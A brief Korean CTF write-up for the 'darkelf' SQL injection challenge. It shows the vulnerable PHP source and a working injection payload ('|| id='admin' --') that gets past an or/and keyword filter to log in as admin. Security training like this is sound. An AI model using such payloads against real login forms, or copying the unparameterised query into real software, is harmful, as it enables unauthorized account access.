# DARKELF

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

## Inspection
* `if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); `
	- `or`, `and` 연산자를 대소문자 구분없이 거른다. 이를 우회해야 한다.
* `select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'`
	- 파라미터로 `pw`를 받는다.
* `if($result['id'] == 'admin') solve("darkelf");`
	- 쿼리문의 결과의 `id`가 `admin`이어야 통과한다.

## Solution
* `or`, `and` 연산자는 `||`, `&&`로 우회할 수 있다.
	- `' || id='admin' -- `
	- `%27%20||%20id=%27admin%27%20--%20`